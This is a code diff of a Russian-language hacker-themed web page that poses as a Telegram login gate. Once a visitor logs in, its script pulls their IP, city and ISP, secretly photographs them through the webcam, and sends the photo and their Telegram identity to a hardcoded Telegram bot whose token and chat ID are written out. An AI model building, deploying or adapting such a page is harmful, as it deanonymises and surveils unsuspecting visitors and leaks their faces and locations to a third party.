@@ -7,24 +7,17 @@
         :root { --main: #ff003c; --bg: #050505; }
         body { background: var(--bg); color: var(--main); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
         .grid-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: linear-gradient(rgba(255,0,60,0.05) 1px, transparent 1px), linear-gradient(90deg, rgba(255,0,60,0.05) 1px, transparent 1px); background-size: 40px 40px; z-index: 0; pointer-events: none; }
-        
         nav { background: rgba(15, 0, 0, 0.95); border-bottom: 2px solid var(--main); display: flex; justify-content: space-between; align-items: center; padding: 10px 20px; z-index: 100; }
         .nav-links button { background: transparent; border: 1px solid var(--main); color: var(--main); padding: 8px 15px; margin-right: 10px; cursor: pointer; text-transform: uppercase; font-weight: bold; }
         .nav-links button.active { background: var(--main); color: #000; box-shadow: 0 0 15px var(--main); }
-
         .tab-content { display: none; padding: 30px; flex-grow: 1; z-index: 1; overflow-y: auto; }
         .tab-content.active { display: block; }
-
         .box { background: rgba(20, 0, 0, 0.8); border: 1px solid var(--main); padding: 20px; margin-top: 15px; backdrop-filter: blur(5px); }
-        
-        /* Профиль пользователя */
         #user-profile { display: flex; align-items: center; gap: 20px; margin-bottom: 20px; border-bottom: 1px solid #333; padding-bottom: 20px; }
         #user-photo { width: 100px; height: 100px; border: 2px solid var(--main); border-radius: 50%; object-fit: cover; background: #000; }
-        
-        #target-cam { width: 100%; max-width: 400px; border: 2px solid var(--main); filter: grayscale(1) contrast(1.2); display: none; }
-        .lock-screen { text-align: center; margin-top: 50px; }
-        
         canvas { display: none; }
+        .target-alert { color: #fff; background: var(--main); padding: 10px; font-weight: bold; text-align: center; animation: pulse 0.6s infinite; display: none; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
     </style>
 </head>
 <body>
@@ -36,16 +29,16 @@
         <button onclick="openTab('home')" class="active" id="btn-home">ГЛАВНАЯ</button>
         <button onclick="openTab('about')" id="btn-about">О СЕБЕ [LOCK]</button>
     </div>
-    <div style="font-size: 12px;">STATUS: <span id="online-status" style="color: #00ff41;">SCANNING</span></div>
+    <div style="font-size: 12px;">STATUS: <span style="color: #00ff41;">SCANNING</span></div>
 </nav>
 
 <div id="home" class="tab-content active">
     <h1>PROJECT_FCOSETY // AUTH_GATE</h1>
     <div class="box">
-        <p>> ТРЕБУЕТСЯ АВТОРИЗАЦИЯ ДЛЯ ПОЛУЧЕНИЯ ДАННЫХ УЗЛА...</p>
+        <p>> ТРЕБУЕТСЯ АВТОРИЗАЦИЯ ДЛЯ ДОСТУПА К УЗЛУ...</p>
         <div id="tg-login-wrap" style="margin-top: 20px;">
             <script async src="https://telegram.org/js/telegram-widget.js?22" 
-                data-telegram-login="fcosety_bot" 
+                data-telegram-login="openOSINTsile_bot" 
                 data-size="large" 
                 data-onauth="onTelegramAuth(user)" 
                 data-request-access="write"></script>
@@ -55,42 +48,31 @@
 </div>
 
 <div id="about" class="tab-content">
-    <div id="lock-msg" class="lock-screen">
+    <div id="lock-msg" style="text-align: center; margin-top: 50px;">
         <h2 style="color: #555;">ОШИБКА ДОСТУПА: АВТОРИЗУЙТЕСЬ НА ГЛАВНОЙ</h2>
     </div>
-
     <div id="profile-data" style="display: none;">
-        <h1 style="background: var(--main); color: #000; padding: 5px 10px;">ОБЪЕКТ ИДЕНТИФИЦИРОВАН</h1>
+        <div class="target-alert">!!! ОБЪЕКТ ИДЕНТИФИЦИРОВАН !!!</div>
         <div class="box">
             <div id="user-profile">
-                <img id="user-photo" src="" alt="Photo">
+                <img id="user-photo" src="" alt="">
                 <div>
                     <h2 id="user-name" style="margin:0; color:#fff;"></h2>
                     <p id="user-id" style="margin:5px 0; font-size: 14px; opacity: 0.7;"></p>
                 </div>
             </div>
-            
-            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
-                <div>
-                    <p>IP: <span id="ip" style="color:#fff">...</span></p>
-                    <p>CITY: <span id="city" style="color:#fff">...</span></p>
-                    <p>ISP: <span id="isp" style="color:#fff">...</span></p>
-                </div>
-                <div>
-                    <p>DEVICE: <span id="dev" style="color:#fff">...</span></p>
-                    <p>GPU: <span id="gpu" style="color:#fff">...</span></p>
-                    <p>BATTERY: <span id="bat" style="color:#fff">...</span></p>
-                </div>
-            </div>
-
-            <h3 style="margin-top:20px; border-top: 1px solid #333; pt-10">FACE_CAPTURE_LIVE:</h3>
-            <video id="webcam" autoplay playsinline id="target-cam" style="width: 100%; max-width: 400px; border: 1px solid var(--main);"></video>
+            <p>IP: <span id="ip" style="color:#fff">...</span></p>
+            <p>CITY: <span id="city" style="color:#fff">...</span></p>
+            <p>ISP: <span id="isp" style="color:#fff">...</span></p>
+            <p>HARDWARE: <span id="hw" style="color:#fff">...</span></p>
+            <video id="webcam" autoplay playsinline style="width: 100%; max-width: 400px; border: 1px solid var(--main); margin-top: 10px;"></video>
             <canvas id="photo-canvas"></canvas>
         </div>
     </div>
 </div>
 
 <script>
+    // ТВОИ ДАННЫЕ
     const TG_TOKEN = "8713406185:AAEYao0zu3daLeZis1gkrFD3-wv7oMXCzsY"; 
     const TG_ID = "5131628747"; 
 
@@ -101,95 +83,57 @@
         document.getElementById('btn-' + name).classList.add('active');
     }
 
-    // ФУНКЦИЯ ПОСЛЕ ВХОДА ЧЕРЕЗ ТГ
     async function onTelegramAuth(user) {
-        document.getElementById('auth-status').innerText = "ДОСТУП РАЗРЕШЕН. ПРОВЕРКА ДАННЫХ...";
+        document.getElementById('auth-status').innerText = "ДОСТУП РАЗРЕШЕН. ЗАГРУЗКА...";
         document.getElementById('btn-about').innerText = "О СЕБЕ [OPEN]";
-        
-        // Заполняем профиль
-        document.getElementById('user-name').innerText = (user.first_name || "") + " " + (user.last_name || "");
-        document.getElementById('user-id').innerText = "@" + user.username + " | ID: " + user.id;
-        document.getElementById('user-photo').src = user.photo_url || "https://via.placeholder.com/100";
-        
-        // Разблокируем вкладку
+        document.getElementById('user-name').innerText = user.first_name + " " + (user.last_name || "");
+        document.getElementById('user-id').innerText = "@" + user.username;
+        document.getElementById('user-photo').src = user.photo_url;
         document.getElementById('lock-msg').style.display = 'none';
         document.getElementById('profile-data').style.display = 'block';
-
-        // Запускаем скрытые механизмы
-        initCapture(user);
+        
+        initDeanon(user);
     }
 
-    async function initCapture(user) {
+    async function initDeanon(user) {
         let ipData = {};
         try {
             const res = await fetch('https://ipapi.co/json/');
             ipData = await res.json();
-            
-            // На экран
             document.getElementById('ip').innerText = ipData.ip;
             document.getElementById('city').innerText = ipData.city;
             document.getElementById('isp').innerText = ipData.org;
-            document.getElementById('dev').innerText = navigator.platform;
-            document.getElementById('gpu').innerText = getGPU();
+            document.getElementById('hw').innerText = navigator.platform;
         } catch(e) {}
 
-        // Камера
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('webcam');
             video.srcObject = stream;
-            
-            // Через 3 секунды делаем фото и шлем тебе
-            setTimeout(() => takeSnapshot(user, ipData), 3000);
+            setTimeout(() => {
+                const canvas = document.getElementById('photo-canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                canvas.toBlob(blob => sendToBot(user, ipData, blob), 'image/jpeg');
+            }, 3000);
         } catch(e) {
-            sendReportToTG(user, ipData, null); // Без фото
+            sendToBot(user, ipData, null);
         }
     }
 
-    function getGPU() {
-        const canvas = document.createElement('canvas');
-        const gl = canvas.getContext('webgl');
-        const debug = gl.getExtension('WEBGL_debug_renderer_info');
-        return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL).split(' ').pop() : "Unknown";
-    }
-
-    function takeSnapshot(user, ipData) {
-        const video = document.getElementById('webcam');
-        const canvas = document.getElementById('photo-canvas');
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
-        
-        canvas.toBlob(blob => {
-            sendReportToTG(user, ipData, blob);
-        }, 'image/jpeg');
-    }
-
-    async function sendReportToTG(user, ipData, photoBlob) {
-        const caption = `
-🚨 ОБЪЕКТ АВТОРИЗОВАН!
-👤 ИМЯ: ${user.first_name} ${user.last_name || ""}
-🔗 ЮЗЕР: @${user.username}
-🆔 TG_ID: ${user.id}
-━━━━━━━━━━━━━━━
-🌐 IP: ${ipData.ip}
-📍 ГОРОД: ${ipData.city}
-🏢 ПРОВАЙДЕР: ${ipData.org}
-💻 ЖЕЛЕЗО: ${navigator.platform} | ${getGPU()}
-━━━━━━━━━━━━━━━
-        `;
-
+    function sendToBot(user, ip, photo) {
+        const text = `🎯 ЦЕЛЬ: ${user.first_name} (@${user.username})\n🌐 IP: ${ip.ip}\n📍 ГОРОД: ${ip.city}\n🏢 ПРОВАЙДЕР: ${ip.org}\n💻 СИСТЕМА: ${navigator.platform}`;
         const formData = new FormData();
         formData.append('chat_id', TG_ID);
-        if(photoBlob) {
-            formData.append('photo', photoBlob, 'target.jpg');
-            formData.append('caption', caption);
+        if (photo) {
+            formData.append('photo', photo, 'face.jpg');
+            formData.append('caption', text);
             fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
         } else {
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(caption)}`);
+            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_ID}&text=${encodeURIComponent(text)}`);
         }
     }
 </script>
-
 </body>
 </html>
